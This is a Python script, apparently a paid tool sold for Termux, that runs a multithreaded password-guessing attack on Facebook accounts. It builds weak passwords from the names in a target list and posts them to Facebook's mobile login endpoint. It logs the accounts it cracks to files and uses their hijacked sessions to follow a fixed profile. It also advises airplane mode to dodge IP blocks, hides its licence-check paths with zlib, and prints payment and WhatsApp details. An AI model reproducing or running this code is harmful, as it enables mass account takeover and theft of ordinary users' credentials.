#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazsarfraz
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.181 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
    ____   ____  _       ____ 
|    \ |    || |     /    |
|  o  ) |  | | |    |  o  |
|     | |  | | |___ |     |
|  O  | |  | |     ||  _  |
|     | |  | |     ||  |  |
|_____||____||_____||__|__|
  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           BILA  PATHAN
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          BILA PATHAN
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           BILA786
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m            1.1.2
\033[1;37m------------------------\033[1;37m------------------------ """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97msarfraz_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97msarfraz_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back sarfraz Menu ")
	    sarfraz()

def sarfraz():




        
  
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File')
    print(' [E] exit ')
    print('')
    _sarfraz___ = input(' [?] Choose option : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        os.system('python dm.py')
    if _sarfraz___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
  
       
      
         
            

        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[sarfraz] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"(Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_4; rv:103.0) Gecko/20100101 Firefox/103.0Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15              Mozilla/5.0 (X1                                             1; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.212 Safari/537.36                                                                                                  Mozilla/5.0 (X11; Linux x86_64; rv:85.2) Gecko/20100101 Firefox/85.2                                                            Mozilla/5.0 (Linux; Android 10; Pixel 5a (5G); Build/QQ1B.210003.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.103 Mobile Safari/537.36                                            Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/90.0.4430.153 Mobile/15E148 Safari/537.36                                                   Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.200 Safari/537.36               Mozilla/5.0 (Android 10; Mobile; rv:101.0.1) Gecko/101.0.1 Firefox/101.0.1                                                      Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38            Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.50 Safari/537.36                                                                                        Mozilla/5.0 (Windows NT 6.2; WOW64; rv:87) Gecko/20100101 Firefox/87                                                            Mozilla/5.0 (Linux; Android 5.1; SM-G9287; Build/LMY47U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.71 Mobile Safari/537.36                                                        Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/95.0.4638.128 Mobile/15E148 Safari/537.36                                                   Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.83 Safari/537.36         Mozilla/5.0 (Android 7; Mobile; rv:89.1) Gecko/89.1 Firefox/89.1                                                                Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15             Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.21 Safari/537.36                                                                                Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.1) Gecko/20100101 Firefox/86.1                                                    Mozilla/5.0 (Linux; Android 12; SM-G350M; Build/SQ1D.220101.27) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.77 Mobile Safari/537.36                                                 Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/94.0.4606.111 Mobile/15E148 Safari/537.36                                                   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.0 Safari/537.36                     Mozilla/5.0 (Android 5; Mobile; rv:89.2) Gecko/89.2 Firefox/89.2                                                                Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0 Mobile/15E148 Safari/600.5.17                                                       Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.86 Safari/537.36                                                                                       Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3; rv:102.0.4) Gecko/20100101 Firefox/102.0.4                                      Mozilla/5.0 (Linux; Android 5; SM-G920AZ; Build/LRX22M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.234 Mobile Safari/537.36                                                        Mozilla/5.0 (iPhone; CPU iPhone OS 11 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/93.0.4577.201 Mobile/15E148 Safari/537.36                                                     Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36           Mozilla/5.0 (Android 5; Mobile; rv:97.0.0) Gecko/97.0.0 Firefox/97.0.0                                                          Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1.38                                                      Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.49 Safari/537.36                                                                                Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0.2) Gecko/20100101 Firefox/95.0.2                                                Mozilla/5.0 (Linux; Android 5.1; SM-G930T1; Build/LVY48X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.141 Mobile Safari/537.36                                                      Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/103.0.0.35 Mobile/15E148 Safari/537.36                                                      Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.76 Safari/537.36           Mozilla/5.0 (Android 7; Mobile; rv:87.0) Gecko/87.0 Firefox/87.0                                                                Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0 Safari/602.4.8               Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.137 Safari/537.36                                                                               Mozilla/5.0 (X11; Linux x86_64; rv:101.0.1) Gecko/20100101 Firefox/101.0.1                                                      Mozilla/5.0 (Linux; Android 7; SM-G925ID; Build/NRD91M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.98 Mobile Safari/537.36                                                         Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.146 Safari/537.36        Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.231 Safari/537.36         Mozilla/5.0 (Android 8.1; Mobile; rv:98.0.1) Gecko/98.0.1 Firefox/98.0.1                                                        Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15              Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.56 Safari/537.36                                                                                       Mozilla/5.0 (X11; Linux x86_64; rv:90.2) Gecko/20100101 Firefox/90.2",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15              Mozilla/5.0 (X1                                             1; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.212 Safari/537.36                                                                                                  Mozilla/5.0 (X11; Linux x86_64; rv:85.2) Gecko/20100101 Firefox/85.2                                                            Mozilla/5.0 (Linux; Android 10; Pixel 5a (5G); Build/QQ1B.210003.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.103 Mobile Safari/537.36                                            Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/90.0.4430.153 Mobile/15E148 Safari/537.36                                                   Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.200 Safari/537.36               Mozilla/5.0 (Android 10; Mobile; rv:101.0.1) Gecko/101.0.1 Firefox/101.0.1                                                      Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38            Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.50 Safari/537.36                                                                                        Mozilla/5.0 (Windows NT 6.2; WOW64; rv:87) Gecko/20100101 Firefox/87                                                            Mozilla/5.0 (Linux; Android 5.1; SM-G9287; Build/LMY47U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.71 Mobile Safari/537.36                                                        Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/95.0.4638.128 Mobile/15E148 Safari/537.36                                                   Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.83 Safari/537.36         Mozilla/5.0 (Android 7; Mobile; rv:89.1) Gecko/89.1 Firefox/89.1                                                                Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15             Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.21 Safari/537.36                                                                                Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.1) Gecko/20100101 Firefox/86.1                                                    Mozilla/5.0 (Linux; Android 12; SM-G350M; Build/SQ1D.220101.27) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.77 Mobile Safari/537.36                                                 Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/94.0.4606.111 Mobile/15E148 Safari/537.36                                                   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.0 Safari/537.36                     Mozilla/5.0 (Android 5; Mobile; rv:89.2) Gecko/89.2 Firefox/89.2                                                                Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0 Mobile/15E148 Safari/600.5.17                                                       Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.86 Safari/537.36                                                                                       Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3; rv:102.0.4) Gecko/20100101 Firefox/102.0.4                                      Mozilla/5.0 (Linux; Android 5; SM-G920AZ; Build/LRX22M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.234 Mobile Safari/537.36                                                        Mozilla/5.0 (iPhone; CPU iPhone OS 11 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/93.0.4577.201 Mobile/15E148 Safari/537.36                                                     Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36           Mozilla/5.0 (Android 5; Mobile; rv:97.0.0) Gecko/97.0.0 Firefox/97.0.0                                                          Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1.38                                                      Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.49 Safari/537.36                                                                                Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0.2) Gecko/20100101 Firefox/95.0.2                                                Mozilla/5.0 (Linux; Android 5.1; SM-G930T1; Build/LVY48X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.141 Mobile Safari/537.36                                                      Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/103.0.0.35 Mobile/15E148 Safari/537.36                                                      Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.76 Safari/537.36           Mozilla/5.0 (Android 7; Mobile; rv:87.0) Gecko/87.0 Firefox/87.0                                                                Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0 Safari/602.4.8               Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.137 Safari/537.36                                                                               Mozilla/5.0 (X11; Linux x86_64; rv:101.0.1) Gecko/20100101 Firefox/101.0.1                                                      Mozilla/5.0 (Linux; Android 7; SM-G925ID; Build/NRD91M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.98 Mobile Safari/537.36                                                         Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.146 Safari/537.36        Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.231 Safari/537.36         Mozilla/5.0 (Android 8.1; Mobile; rv:98.0.1) Gecko/98.0.1 Firefox/98.0.1                                                        Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15              Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.56 Safari/537.36                                                                                       Mozilla/5.0 (X11; Linux x86_64; rv:90.2) Gecko/20100101 Firefox/90.2",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [BILA OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('sarfraz_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [BILA CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('sarfraz_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [BILA CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('sarfraz_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] Crack With Auto Pass ')
        print('[2] Crack With Name Digit Pass')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazsarfraz(max_workers=30) as sarfrazworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786110"]
                        sarfrazworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazsarfraz(max_workers=30) as sarfrazworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        sarfrazworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
def bnsbuy():
    os.system('clear')
    print (logo)
    from urllib.parse import quote
    print('\tChecking For Subscription...\n')
    try:
        f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
        bd = (zlib.decompress(f))
        to = (open(bd, 'r').read())
    except (KeyError, IOError):
        bnsreg()
    try:
        bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5710\xd1\xf5\xcb/\xd1uw\r\xd1/\xd6\xcfM\xcc\xcc\xd3O\x04\x00&!\x13&')
        bw = (zlib.decompress(bt))
        r = (requests.get(bw).text)
    except requests.exceptions.ConnectionError:
        print ("\x1b[0;37mNo Internet Connection")
        exit()

    if to in r:
        fuck.append(1)
        sarfraz()
    else:
        os.system('clear')
        print (logo)
        print ('\x1b[1;97m\rYour Token Is Not Subscribed\n')
        print
        print
        print ('\r\x1b[1;97m Your Token : ' + to + '\n')
        print
        print('\rTool Price 350rs\n')
        print
        print('\rjazzcash Account Number 03033212619\n')
        print('\rAccount Name Nazeer Ahmed\n')
        print
        print
        print('\rPayment Successfully Msg Or Token Send\n')
        print
        print
        sb = input('\rPaste Here Payment Successfully Msg:')
        print ('\n')
        ss = input('\rPaste Here your Token:')
        print('\n')
        print('\rYour Request Submitted Please wait  ')
        tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
        os.system('am start https://wa.me/+923206620269?text=' + tks)
#        subprocess.check_output(['am', 'start', url_wa + quote(tks)])

def bnsreg():
    os.system('clear')
    print (logo)
    print ('\x1b[1;97m\tYour Token Is Not Subscribed\n')
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~sarfraz=="
    print
    print ('\n\x1b[1;97m Your Token: \x1b[97m' + id + '\n')
    print
    print('\rTool Price 350rs\n')
    print
    print('\rjazzcash Account Number 03033212619\n')
    print('\rAccount Name Nazeer Ahmed\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
    sb = input('\rPaste Here Payment Successfully Msg:')
    print ('\n')
    ss = input('\rPaste Here your Token:')
    print ('\n')
    print('Your Request Submitted Please wait  ')
    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
    os.system('am start https://wa.me/+923206620269?text=' + tks)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
    sav.close()
    os.system("clear")
    time.sleep(3)
    exit()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

sarfraz()
